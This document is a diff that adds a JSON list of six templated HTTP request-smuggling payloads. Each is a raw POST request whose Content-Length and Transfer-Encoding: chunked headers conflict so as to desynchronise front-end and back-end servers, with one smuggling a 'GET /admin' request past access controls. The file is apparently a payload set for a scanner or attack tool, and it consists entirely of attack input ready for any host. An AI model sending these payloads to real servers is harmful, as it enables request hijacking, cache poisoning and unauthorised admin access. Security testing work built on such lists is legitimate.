@@ -1,0 +1,8 @@
+[
+  "POST / HTTP/1.1\nHost: {host}\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nG",
+  "POST / HTTP/1.1\nHost: {host}\nContent-Length: 4\nTransfer-Encoding: chunked\n\n5\nGPOST\n0\n",
+  "POST / HTTP/1.1\nHost: {host}\nTransfer-Encoding: chunked\nContent-Length: 6\n\n0\n",
+  "POST / HTTP/1.1\nHost: {host}\nTransfer-Encoding: chunked\nContent-Length: 0\n\n0\nSMUGGLED",
+  "POST / HTTP/1.1\nHost: {host}\nTransfer-Encoding: chunked\n\na\nSMUGGLED\n0\n",
+  "POST / HTTP/1.1\nHost: {host}\nTransfer-Encoding: chunked\nContent-Length: 10\n\n0\n\nGET /admin HTTP/1.1\nHost: {host}"
+]
